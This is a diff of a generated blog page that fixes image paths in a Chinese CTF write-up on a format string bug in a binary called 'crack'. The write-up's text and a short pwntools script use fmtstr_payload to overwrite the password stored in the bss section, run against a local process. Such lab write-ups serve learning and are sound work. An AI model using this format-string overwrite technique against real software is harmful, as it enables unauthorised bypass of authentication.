@@ -22,16 +22,16 @@
 <meta property="og:site_name" content="ticker-tape timer&#39;s blog">
 <meta property="og:description" content="crack这是一道格式化字符串题打开IDA，看源码。 他读取了密码，然后要求你输入的字符要匹配该密码可以看到printf那里存在格式化字符串漏洞该文件给出了password的bss字段地址用gdb调试看看发现，name后面要求输入的参数是printf的第10个，所以可知偏移量为10百度了一波，发现有一个fmtstr_payload函数，可以直接改password的值（原理不太懂）于是构造paylo">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://whyiamddjsq.icu/.icu//%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/1.png">
-<meta property="og:image" content="http://whyiamddjsq.icu/.icu//%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/5.png">
-<meta property="og:image" content="http://whyiamddjsq.icu/.icu//%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/2.png">
-<meta property="og:image" content="http://whyiamddjsq.icu/.icu//%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/3.png">
-<meta property="og:image" content="http://whyiamddjsq.icu/.icu//%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/4.png">
+<meta property="og:image" content="http://whyiamddjsq.icu/2020/05/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/1.png">
+<meta property="og:image" content="http://whyiamddjsq.icu/2020/05/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/5.png">
+<meta property="og:image" content="http://whyiamddjsq.icu/2020/05/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/2.png">
+<meta property="og:image" content="http://whyiamddjsq.icu/2020/05/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/3.png">
+<meta property="og:image" content="http://whyiamddjsq.icu/2020/05/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/4.png">
 <meta property="article:published_time" content="2020-05-16T10:34:14.000Z">
 <meta property="article:modified_time" content="2020-07-17T03:11:57.468Z">
 <meta property="article:author" content="ticker-tape timer">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://whyiamddjsq.icu/.icu//%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/1.png">
+<meta name="twitter:image" content="http://whyiamddjsq.icu/2020/05/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/1.png">
 
   
 
@@ -187,9 +187,9 @@ ga('send', 'pageview');
   <div class="article-content">
     
       <h2 id="crack"><a href="#crack" class="headerlink" title="crack"></a>crack</h2><p>这是一道格式化字符串题<br>打开IDA，看源码。</p>
-<p><img src="/.icu//%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/1.png" alt="1"><br>他读取了密码，然后要求你输入的字符要匹配该密码<br>可以看到<code>printf</code>那里存在格式化字符串漏洞<br>该文件给出了<code>password</code>的<code>bss</code>字段地址<br><img src="/.icu//%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/5.png" alt="5"><br>用gdb调试看看<br><img src="/.icu//%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/2.png" alt="2"><br><img src="/.icu//%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/3.png" alt="3"><br>发现，<code>name</code>后面要求输入的参数是<code>printf</code>的第10个，所以可知偏移量为10<br>百度了一波，发现有一个<code>fmtstr_payload</code>函数，可以直接改<code>password</code>的值（原理不太懂）<br>于是构造payload试试</p>
+<p><img src="/2020/05/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/1.png" alt="1"><br>他读取了密码，然后要求你输入的字符要匹配该密码<br>可以看到<code>printf</code>那里存在格式化字符串漏洞<br>该文件给出了<code>password</code>的<code>bss</code>字段地址<br><img src="/2020/05/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/5.png" alt="5"><br>用gdb调试看看<br><img src="/2020/05/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/2.png" alt="2"><br><img src="/2020/05/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/3.png" alt="3"><br>发现，<code>name</code>后面要求输入的参数是<code>printf</code>的第10个，所以可知偏移量为10<br>百度了一波，发现有一个<code>fmtstr_payload</code>函数，可以直接改<code>password</code>的值（原理不太懂）<br>于是构造payload试试</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">'./crack'</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;<span class="number">0x804A048</span>:<span class="number">1111</span>&#125;)</span><br><span class="line">p.recvuntil(<span class="string">'What your name ? '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'Your password :'</span>)</span><br><span class="line">p.sendline(<span class="string">'1111'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="/.icu//%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/4.png" alt="4"><br>OJBK</p>
+<p><img src="/2020/05/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bcrack/4.png" alt="4"><br>OJBK</p>
 
     
   </div>
